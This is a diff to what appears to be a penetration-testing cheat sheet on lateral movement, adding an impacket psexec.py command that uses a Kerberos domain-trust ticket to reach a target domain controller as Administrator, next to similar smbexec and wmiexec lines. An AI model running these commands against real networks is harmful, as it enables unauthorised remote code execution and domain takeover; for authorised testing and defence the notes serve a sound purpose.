@@ -67,6 +67,11 @@ python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
+#### Example impacket Domain Trust ticket
+```
+python3 /opt/impacket/examples/psexec.py -dc-ip <CHILD DC FQDN> <DOMAIN>/Administrator@<TARGET DC FQDN> -k -no-pass -debug
+```
+
 ## PSSession
 #### Save pssession in variable
 ```
